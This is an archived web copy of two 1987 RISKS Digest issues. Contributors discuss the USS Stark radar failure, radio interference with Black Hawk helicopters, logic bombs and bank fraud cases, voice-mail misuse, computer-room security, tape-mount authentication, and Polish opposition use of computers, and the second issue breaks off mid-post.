</A>
<DD>
<A HREF="#subj1.1">
Hugh Miller
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Follow-up to Black Hawk Failures article 
</A>
<DD>
<A HREF="#subj2.1">
Dave Newkirk
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Jamming the Chopper 
</A>
<DD>
<A HREF="#subj3.1">
Brint Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Computer systems hit by logic bombs 
</A>
<DD>
<A HREF="#subj4.1">
J.D. Bonser
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Risk of more computers 
</A>
<DD>
<A HREF="#subj5.1">
Arthur David Olson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Reach out and (t)ouch! 
</A>
<DD>
<A HREF="#subj6.1">
Matthew Kruk
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Password truncation and human interfaces 
</A>
<DD>
<A HREF="#subj7.1">
Mark W. Eichin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Mobile Radio Interference With Vehicles 
</A>
<DD>
<A HREF="#subj8.1">
Ian Batten
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Computer terrorism 
</A>
<DD>
<A HREF="#subj9.1">
Brint Cooper
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
     Son of Stark
</A>
</H3>
<address>
Hugh Miller 
&lt;<A HREF="mailto:HUGH%UTORONTO.BITNET@wiscvm.wisc.edu">
HUGH%UTORONTO.BITNET@wiscvm.wisc.edu
</A>&gt;
</address>
<i>
Sun, 15 Nov 87 11:19:15 EST
</i><PRE>

The  following  appeared  in this morning's edition  of  the  *Toronto
Star*, Sunday 15 November 1987. Here we go again:

    WASHINGTON (AP) - Deficient radar equipment aboard the USS  Stark,
    and not the ship's crew, was chiefly responsible for the frigate's
    failure to defend itself against an Iraqi missile attack last May,
    the  ship's  captain  said in his first extensive comment  on  the
    incident.

        Capt. Glenn Brindel acknowledged "deficiencies in  the  watch"
    aboard the ship,  but wrote,  "Their actions or inactions ...  are
    not  primary causes for Stark's failure to defend against the  ...
    attack.

        "Unfortunately,  the  ship's  radars and electronics  did  not
    function as advertised."

        His  assertion directly contradicts the official US Navy board
    of inquiry findings, released in a censored version Oct. 15.

        It  also  raises new questions about the  ability  of  similar
    frigates  - at  least  six ships of the same  type  are  currently
    deployed  in  the  Persian  Gulf - to  defend  themselves  against
    such attacks.

        Brindel expressed his views in a lengthy letter to the editor,
    printed in tomorrow's editions of the weekly newspaper Navy Times.

        The  board of inquiry harshly criticized Brindel and  some  of
    his  top officers for failing to defend the Stark from two  Exocet
    missiles fired from an Iraqi jet May 17.

        Brindel  said  Stark's radar systems should have detected  the
    Exocets.

        "They did not," he wrote.

        Brindel,  the board of inquiry concluded,  "failed to  provide
    combat-oriented  leadership,  allowing  Stark's  anti-air  warfare
    readiness to disintegrate to the point that his Combat Information
    Center team was unable to defend the ship."

        Thirty-seven sailors died in the attack.


Would someone who has quick access to Navy Times be so kind as to send in
extracts from Brindel's letter giving details?  Specifically, will we now
find out that the Phalanx was on after all, and pulled a Divad?  Capt.
Brindel, it appears, has been made to take a dive for a bad P-sub-k.  Hope
this doesn't hurt his pension.

Hugh Miller, Toronto, Ont.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Follow-up to Black Hawk Failures article
</A>
</H3>
<address>
&lt;<A HREF="mailto:ihnp4!ihlpm!dcn@ucbvax.Berkeley.EDU">
ihnp4!ihlpm!dcn@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Sat, 14 Nov 87 17:33:16 PST
</i><PRE>

COPTERS GET SHIELD FROM DEADLY RADIO

Wahington - The Army, alarmed by new test results showing that radio waves
can shut down the vital hydraulic system of its Black Hawk helicopter, will
shield the system's electronic controls from such interference, Army officials 
said Wednesday [November 11, 1987].  Radio waves triggered a ``complete
hydraulic failure'' on a UH-60 Black Hawk by generating false electrical
commands in the system, according to test results.  The Army's decision
comes after a series of crashes in which the helicopters nosedived into the
ground.  Since 1982, 22 servicemen have been killed in five Black Hawk crashes.

(From the Chicago Tribune, November 11, 1987 - dcn)
                  				  Dave Newkirk, ihnp4!ihlpm!dcn

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Jamming the Chopper
</A>
</H3>
<address>
Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.ARPA">
abc@BRL.ARPA
</A>&gt;
</address>
<i>
Thu, 12 Nov 87 8:28:13 EST
</i><PRE>

From wire service reports:

	"The Army, alarmed by new test results showing that radio waves
can shut down the vital hydraulic system of its Black Hawk helicopter,
will shield the system's electronic controls from such interference, t
Army officials said yesterday.

	Radio waves triggered a "complete hydraulic failure" on a UH-60
Black Hawk by generating false electrical commands in the system,
according to the Army's latest test results.  When that happens, the
pilot can't control the aircraft.

	The Army's decision, disclosed at a private meeting this week
with officials from Sikorsky Aircraft Co., the Black   Hawk contractor,
comes after a series of crashes in which the helicopters nose-dived into
the ground.

	The Black Hawk's logic module...will be replaced with the
shielded version already used aboard the Navy Sea Hawk, a derivative of
the Army chopper, according to Army officials."


Two thoughts:

	1. If the Sea Hawk is a derivative of the Black Hawk, why is it
that the former has the shielded control module and not the latter?  Is
the Navy smarter than the Army?

	2. Didn't we have a discussion in RISKS of similar problems with
electronic anti-skid automotive braking systems some time ago?  Did it
conclude anything?
                                        _Brint

    [Yes.  Not really.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Computer systems hit by logic bombs
</A>
</H3>
<address>
"J.D. Bonser" 
&lt;<A HREF="mailto:jdb%watsup.waterloo.edu@RELAY.CS.NET">
jdb%watsup.waterloo.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Fri, 13 Nov 87 16:37:35 EST
</i><PRE>

Excerpted without permission from the front page of the
Toronto Globe and Mail, 3 November 1987.

Computer systems hit by `logic bombs'
-------------------------------------

A disgruntled employee of a London Ontario company recently planted
a surprise in the corporation's computer - a ``logic bomb,'' which
would, on a certain date, knock out the entire system.  It was found 
in time and the man was prosecuted ``but it would have destroyed 
their complete computer system - it would have been down for months,'' 
Sergeant Ted Green of the Ontario Provincial Police said yesterday.  
The London man who planted the ``logic bomb'' ... was later acquitted 
of the crime ... the trial judge refused to admit evidence of a 
previous ``bomb'' he had allegedly planted in a computer system of an 
Alberta company because the firm had refused to press charges.

In another case involving a Toronto company, a similar ``logic bomb''
was activated the day the employee's termination notice was 
processed in the computer system.  ``It wiped out the whole system,'', 
said Sgt. Green, ... a specialist in computer crime. 

In another case Sgt. Green worked on, a bank branch decided on the
occasion of its 10th anniversary to honor the customer who had the
most active account.  It turned out to be an employee who had 
accumulated $70,000 funnelling a few cents out of every account into
his own.  ``He said: `Go ahead and charge me.  I will tell the public 
you have been doing this for years.'  It was true.  The bank had been
rounding off (customers') accounts and putting them into sundry
accounts.''

A man in southwestern Ontario acquired a printing press and ran off
thousands of bank deposit slips with the computerized code for his
own bank account on the bottom of each.  Then he discreetly left
piles of them on counters at a number bank branches ... [and] the
deposits went into his account. 

A number of employees of a Toronto-area machinery supplier extracted
computer lists of clients and blueprints in order to set up their
own rival company.  The scheme was discovered at the last minute and
a trial is scheduled to be held soon.

Sgt. Green said current legislation is adequate to deal with the
problem.  ``Our concern is people are reluctant to bring (information)
to us.'' 

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Risk of more computers
</A>
</H3>
<address>
Arthur David Olson
&lt;<A HREF="mailto:elsie!ado.UUCP@SEISMO.ARPA ">
elsie!ado.UUCP@SEISMO.ARPA 
</A>&gt;
</address>
<i>
Sat, 14 Nov 87 14:06:27 EST
</i><PRE>

The November 11, 1987 Washington Post includes a UPI account of
President Reagan's proposed legislation on child pornography.
The proposal ". . .would give prosecutors the right to move against computer
networks and parents who permit their children to be used in pornography."

This newly discovered capability of computer networks to have children may
explain the volume of mail that's been overwhelming the moderator of late.
Had the computing community known earlier what the result of connecting
CSNET, BITNET, USENET, and friends would be. . .
                          				--ado

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Reach out and (t)ouch!
</A>
</H3>
<address>
&lt;<A HREF="mailto:Matthew_Kruk%UBC.MAILNET@MIT-Multics.ARPA">
Matthew_Kruk%UBC.MAILNET@MIT-Multics.ARPA
</A>&gt;
</address>
<i>
Fri, 13 Nov 87 20:10:18 PST
</i><PRE>

Source: Deutsche Presse-Agentur

BONN, West Germany - An elderly West German woman who failed to
replace her telephone receiver properly after a five-minute call to a
relative in Nairobi, Kenya, received a whopping telephone bill for
$2,3000.

Because of a fault in the Kenya exchange, the connection was not cut
and since German telephone exchanges and billing are all computerized,
the live line went unnoticed. The meter ran 10 hours.

The 86-year-old woman asked the West German Telephone Agency to excuse
the debt, but the agency offered to deduct one third of the bill.

She then petitioned Parliament, which ruled this week that she would
have to pay one-third of the bill for carelessness.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Password truncation and human interfaces
</A>
</H3>
<address>
Mark W. Eichin 
&lt;<A HREF="mailto:eichin@ATHENA.MIT.EDU">
eichin@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Fri, 13 Nov 87 15:05:27 EST
</i><PRE>

What is especially interesting (in the BayBanks case) is that 
	1) It is only on DieBold machines (cross-network stuff needs
the whole string)
	2) The screens actually flicker visibly once you have pressed
the fourth digit, making this feature easy to suspect...
                         					_Mark_

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
      Mobile Radio Interference With Vehicles (<A HREF="/Risks/5.57.html">RISKS-5.57</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Organisation:  University of Birmingham Computer Science Department
Date:          Fri, 13 Nov 87 12:43:43 GMT
From:          Ian G Batten &lt;BattenIG@CS.BHAM.AC.UK&gt;

There was some trouble a year or so ago I read of in one of the Car
magazines with engine management systems on several makes of car.  It
appeared that when driving near Daventry (about 25 miles south of here
on the road to London) their engines would die.  This was traced to RFI
from the powerful transmitter field there (Nationwide Radio Four, on
1500 metres is transmitted from there, along with the local Medium Wave
and FM stuff.  The level of transmissions around there certainly taxes
my car's radio!)
                                     ian

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
 Computer terrorism
</A>
</H3>
<address>
Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.ARPA">
abc@BRL.ARPA
</A>&gt;
</address>
<i>
Fri, 13 Nov 87 16:57:38 EST
</i><PRE>

Article 114 of comp.society:
Path: brl-adm!umd5!mimsy!oddjob!hao!ames!sdcsvax!ucsdhub!hp-sdd!hplabs!hplabsz!taylor
From: rhorn@infinet.UUCP (Rob Horn)
Subject: Computer usage by Solidarity in Poland
Date: 10 Nov 87 19:31:54 GMT

This is a sketch of the article, ``Of Systems, Solidarity, and
Struggle'' in Datamation, 1 November 1987.

  ``You know why there are so few sophisticated computer
terrorists in the United States?  Because your hackers have so
much mobility into the establishment.  Here, there is no such
mobility.  If you have the slightest bit of intellectual
integrity you cannot support the government.... That's why the
best computer minds belong to the opposition.''  - Anonymous

This opens a good article on how computers are being used by the
opposition in Poland.  Go find a copy of Datamation and read it.

Solidarity is now becoming computerized.  Computers are used to
write articles, track election fraud, maintain organizations, and
maintain communications.  Using computers for such illegal
purposes is not without penalties.  Typical sentences for
opposition activities are 1-2 years when the crimes are
non-violent.

The government has focused its efforts on severing the
communications that make opposition efforts effective.  When they
initially severed the public telephone system, computer
operators used internal private line systems to maintain
communications.  With martial law, these too were shut down.  Now
the primary modes of communication are either by mail or by
courier.  A floppy disk is easy to hide in a package or carry
unobtrusively.

Personal computers are now widespread in Poland, acquired both
legally and by smuggling.  There are an estimated 500,000
personal computers in Poland, with Sinclair and Amstrad being the
most popular.  There are an estimated 700 illegal publications
being generated by everything from matrix printers to
laserwriters.  Nearly two thirds of the non-violent crime in
Poland is associated with illegal press and opposition
activities.

The government has had to choose between the serious economic
damage that would result from eliminating computers and their
elimination as an opposition tool.  So far, they have been forced
to allow the continued use of computers.

The security capabilities of computers are also important to
Solidarity.  Telephone calls can be traced and monitored; floppy
disks are easy to smuggle around.  Paper is very bulky, hard to
conceal, and hard to destroy.  Floppies are very compact, easy to
hide, easy to encrypt, and easy to destroy.

``Every Solidarity center had piles and piles of paper ....
everyone was eating paper and a policeman was at the door.  Now
all you have to do is bend a disk.''
                                       Rob Horn

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.57.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.59.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-11</DOCNO>
<DOCOLDNO>IA012-000130-B022-64</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.59.html 128.240.150.127 19970217014142 text/html 24442
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:39:51 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 59</TITLE>
<LINK REL="Prev" HREF="/Risks/5.58.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.60.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.58.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.60.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 59</H1>
<H2> Monday, 16 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks in Voice Mail 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Stark Reality 
</A>
<DD>
<A HREF="#subj2.1">
LT Scott A. Norton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: How much physical security? 
</A>
<DD>
<A HREF="#subj3.1">
R.M. Richardson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Navy Seahawk helicopters 
</A>
<DD>
<A HREF="#subj4.1">
LT Scott A. Norton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Army Black Hawk helicopters 
</A>
<DD>
<A HREF="#subj5.1">
Peter Ladkin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  External risks 
</A>
<DD>
<A HREF="#subj6.1">
John McLeod
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: A simple application of Murphy's Law (Tape Labels) 
</A>
<DD>
<A HREF="#subj7.1">
Barry Gold
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  EAN and PIN codes 
</A>
<DD>
<A HREF="#subj8.1">
Otto J. Makela
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Computerized Fuel Injection 
</A>
<DD>
<A HREF="#subj9.1">
James M. Bodwin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: Password truncation and human interfaces 
</A>
<DD>
<A HREF="#subj10.1">
Franklin Davis
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risks in Voice Mail 
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Mon 16 Nov 87 21:45:56-PST
</i><PRE>
To: RISKS@KL.SRI.COM

Computerized voice mail is providing rich opportunities for creative misuse,
including the exchange of all sorts of illicit information -- credit card
numbers, passwords, etc.  There is the old tradeoff between easy-to-use
short passwords and hard-to-break long passwords.  Opting for user
friendliness often results in breakability.  There is the problem of tracing
illegal activities back to the misusers, which appears to be more difficult
in voice mail than in the EMAIL counterparts, especially in that voice
mailboxes are currently harder for law enforcement agencies to identify.
Something like $12 can rent you one for a month.  Many familiar problems
also exist, such as authentication, integrity of the messages, presence of
Trojan horses (e.g., monitoring interesting calls, editing calls), etc.
Ain't technology wonderful?

[For Bay Area folks, there was a nice front-page article on the subject by
John Markoff in the Sunday Examiner and Chronicle, 15 November 1987.]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
     Stark Reality (Re: <A HREF="/Risks/5.58.html">RISKS-5.58</A>)
</A>
</H3>
<address>
"LT Scott A. Norton, USN" 
&lt;<A HREF="mailto:4526P%NAVPGS.BITNET@wiscvm.wisc.edu">
4526P%NAVPGS.BITNET@wiscvm.wisc.edu
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 16:43:14 PST
</i><PRE>
To: Risks Forum &lt;RISKS@csl.sri.com&gt;

I sent a more detailed response direct to Hugh Miller, but here is the
gist of Capt Brindel's letter to Navy Times.  The failure of Stark to
defend against the Iraqi Exocets was, according the Capt Brindel, due
to the failure of Stark's search radars and EW system to perform as
advertised.  He asserts that his equipment operators, watch officers,
and maintenance techs did their jobs correctly, but the equipment did
not do what the FFG-7 Class Combat Systems Doctrine said it could.

To address Mr. Miller's question about the Phalanx gun, Capt Brindel
said that it was not activated: "The TAO stated that had he received
proper indications from either the radars or SLQ-32 &lt;radar warning
receiver&gt;, ...  he would have placed the CLose-in Weapons System in
automatic and engaged the target." So, comparisons with Divad are not
appropriate.

LT Scott A. Norton, USN     | From Internet, if you need a gateway, use
Naval Postgraduate School   |    4526p%navpgs.bitnet@jade.berkley.edu
Monterey, CA 93943-5018     | or 4526p%navpgs.bitnet@ucscc.ucsc.edu
4526P@NavPGS.BITNET         | The WISCVM gateway will close 15 Dec 87. )

   [I hope someone is organizing a replacement for WISCVM and its
   automatic system for handling the mailing list...  But I suspect 
   think that "berkeley" might be better than "berkley".  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: How much physical security? (Re: <A HREF="/Risks/5.48.html">RISKS-5.48</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
16 Nov 87 15:51:46 PST (Monday)
</i><PRE>
To: mse%Phobos.Caltech.Edu@DEImos.Caltech.Edu (Martin Ewing)
Cc: RISKS@csl.sri.com, RMRichardson.PA@Xerox.COM
From: Rich &lt;RMRichardson.PA@Xerox.COM&gt;

&gt; There is some fractional risk from physical assault.  The cost of 
&gt; significant improvements seems high.  The value of the facility, 
&gt; including data files, is high also.  How does one rationally decide
&gt; whether the risk is acceptable? 
 
&gt; My tentative answer is not to do anything about physical security.
&gt; The Institute is insured against equipment losses.  

This should be taken care of by trading off between investment in security
facilities and insurance costs.  Is the insurance company astute enough to
check your physical security and adjust the premium accordingly?  (Is
"competent insurance company" an oxymoron?  Oh, sorry. :-)

Also check the change in probability of loss against losses not covered by
insurance (does your insurance cover the cost of lost work while the
equipment is being replaced?).  How long will it take to get replacement
equipment in, up, and running?  Do you "lay off" everyone who needs the
computer to do their job until you're running again?  What is the cost of
lost opportunities during the replacement time?

Do you lose valuable people because your "slovenly security" is a 
sign of incompetence?  Do you lose valuable people because your 
"Draconian security" is unendurable?  

Some thought should expand this list of questions to help you make the
decisionSomewhere in the middle of all these factors is a reasonable area to
operate.  You could even ask your users about this.

&gt; The one thing we don't do is to keep copies of valuable files 
&gt; stored in an independent environment.  This can be done for fairly 
&gt; low cost, although it goes against the grain for researchers to 
&gt; make backups at all.  

Since you have a "mainframe" (rather than workstations), it should be much
easier to backup your file systems (at least the project and user
directories) to mag tape on a weekly basis and take those tapes off site.

&gt; As far as I can see the absolute risk from power surges, flooding, 
&gt; and network breakin is greater.  We have had instances of all of these.

Are any of these covered by insurance?  I'd guess flooding might by and
power surges and breakin are not.  Power surges can be protected against by
equipment and I would think would be worth at least some investment.  At the
very least, you might save some equipment with a latch that must be reset by
hand before re-applying power after an outage.  This allows you to bring the
system back up in an orderly manner.

If you haven't done something about network (or telephone) breakin by
now, your case may well be hopeless.  :-)  
                                                   Rich

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
     Navy SH-60 Seahawk helicopters
</A>
</H3>
<address>
"LT Scott A. Norton, USN" 
&lt;<A HREF="mailto:4526P%NAVPGS.BITNET@wiscvm.wisc.edu">
4526P%NAVPGS.BITNET@wiscvm.wisc.edu
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 14:05:58 PST
</i><PRE>
To: Risks Forum &lt;RISKS@csl.sri.com&gt;

The probable reason the Navy required heavier shielding on their version
of the SH-60 is that when landing on a ship's flight deck, the aircraft
passes right through the main lobe of ship's air search radar(s), about
50 ft from the antenna.  The need for shielding is obvious: you stare
right down the radar's feed horn as it swings around.

LT Scott A. Norton, USN, Naval Postgraduate School, Monterey, CA 93943-5018  

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
UH-60 problems
</A>
</H3>
<address>
Peter Ladkin
&lt;<A HREF="mailto:ladkin@kestrel.ARPA ">
ladkin@kestrel.ARPA 
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 17:34:46 PDT
</i><PRE>

One should note that the problems with the UH-60 are of disputed origin.
Aviation Week and Space Technology, Nov 16 1987, p27 , "Army Modifies UH-60s
To Cut Electromagnetic Interference in Controls":  "Washington - Concern
about the vulnerability of the Sikorsky UH-60 Black Hawk helicopter to
electromagnetic interference has led the Army to modify its aircraft, but
the Army and Sikorsky deny that electromagnetic interference has caused any
crashes of the helicopter. [.....]".

One should beware of inferring by association, because of its social
consequences. A case in point is the V-tail Bonanza, a light aircraft that
has been in production for almost forty years. Over the years, a number were
lost in unexplained in-flight breakups, some with very experienced pilots at
the controls. Beech, for good legal reasons, maintained that the airplane
satisfied the requirements of certification, and did not investigate.
Apparently the presumption was that if they were to conduct their own tests,
this could be used as evidence that they were not completely sure of the
airframe quality, in hypothetical litigation proceedings (this is my
personal interpretation, as well as that of others). This is not by any means
unsound reasoning. They willingly conducted extensive tests when required to
do so by the FAA (which seemed in retrospect to be the obvious solution -
one can wonder about the FAA's tardiness). Meanwhile, many v-tail owners
died.  We all suffer from the consequences of this kind of political/legal
conundrum, and so one should note that the facts are disputed in the UH-60
case. None of which means that the press is wrong, of course.
                                                                peter ladkin

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
External risks (Re: RISKS DIGEST 5.58)
</A>
</H3>
<address>
John McLeod
&lt;<A HREF="mailto:jm7@pyr.gatech.edu ">
jm7@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 16:31:47 EST
</i><PRE>

Another class of risks to computers is accidents external to the complex.  A
couple of years age at the University of New Mexico, several of the
computers were shut down by a backhoe breaking a large water main on
central.  The water from the main flooded the steam tunnels while the steam
pipes were hot.  The temperature in the computer room reached 100F, and the
humidity reached 100%.  This triggered the shutdown sequence for the
computers.  However, the air conditioners overloaded when attempting to cool
this mess to a suitable temperature.  The computers were down for two weeks
while new air conditioners were purchased and installed.

A few weeks ago here at Georgia Institute of Technology, we had a backhoe
break the power cable and the network cables.  The computer was down for
about 12 hours.

JOHN MCLEOD, Georgia Insitute of Technology, Atlanta Georgia, 30332
uucp: ...!{akgua,allegra,amd,hplabs,ihnp4,seismo,ut-ngp}!gatech!gitpyr!jm7

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
       Re: A simple application of Murphy's Law (Tape Labels)
</A>
</H3>
<address>
          Barry Gold 
&lt;<A HREF="mailto:lcc.barry@SEAS.UCLA.EDU">
lcc.barry@SEAS.UCLA.EDU
</A>&gt;
</address>
<i>
Sun, 15 Nov 87 10:46:13 PST
</i><PRE>

In designing the "secure" operating system KVM/370, we considered the
danger of an operator mounting the wrong tape from a different
perspective.  In an environment that mixes applications with different
classification levels, an operator error can result in the data on a
Top Secret tape becoming available to a user who is cleared only to
Secret--or in Top Secret data being written on a tape whose external
label claims it is "unclassified".

We decided to assign a separate "authenticator" to each removable volume
(tape OR disk).  The design was to work as follows:

Every volume, even "foreign" tapes, is assigned a volume id ("name"
and/or location when racked) AND a "password".  This information is
entered in a database, along with the classification level and owner.
The "password" is NOT given out, but is written on the tape's external
label.

When requesting a tape mount, the user specifies the volume id.  The
operator retrieves the tape (or disk) and gives the system the volume
id, the name of the user who is to receive access, and the "password".

The system checks that:

1. the "password" is correct for the volume id.  

2. the classification level of the tape matches the user's current
classification level.  (A user cleared to Top Secret can choose to work
on the Unclassified subset of his data, but will then not get access 
to Top Secret tapes!)

If either of these checks fails, the operator is prompted to try again.
The operator can try again with the same tape (possible typing error)
or a different one, or abort the mount request.

Note that there's no deep dark secret about the volume's "password".  It's
just a check that the right tape has been mounted.  

I think the above scheme would also work to protect against accidental
destruction of data in an unclassified environment.  Just leave out the
classification check.

You might or might not get additional protection by adding a check that
the user who is to get access is the owner.  If not, the USER gets a
prompt "do you want to read (viz write on) xxxx's tape?"  You could even
add a third password that the user gives out to people who should be
able to write on that tape.

Of course, the operator can always get around these checks by "adding" a
new tape and claiming that the tape to be mounted is that tape, or by
calling all tapes a certain standard one with a known volume id and
password.  You need to make sure that operators understand that just ONE
use of that facility that results in overwriting the wrong user's tape
will get them fired.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 EAN and PIN codes
</A>
</H3>
<address>

&lt;<A HREF="mailto:MAKELA_O%FINJYU.bitnet@csl.sri.com">
MAKELA_O%FINJYU.bitnet@csl.sri.com
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 10:42 O
</i><PRE>
To: risks@csl.sri.com

In RISKS 5.57 Elizabeth D. Zwicky writes:
&gt;To the best of my knowledge, this feature is not used by actual UPC (that
&gt;is, in the Uniform Price Code standard), but is used in EAN, the European
&gt;standard which uses the same bar codes.  If they use the check digits for
&gt;something else, then only they will be able to figure out what they are;
&gt;anything that reads UPC will reject it, since UPC specifies what the
&gt;odd/evens must be, anything that reads EAN will reject it because the check
&gt;digits are wrong, and programs that read both will read everything but the
&gt;numbers of interest, because they ignore odd vs. even.

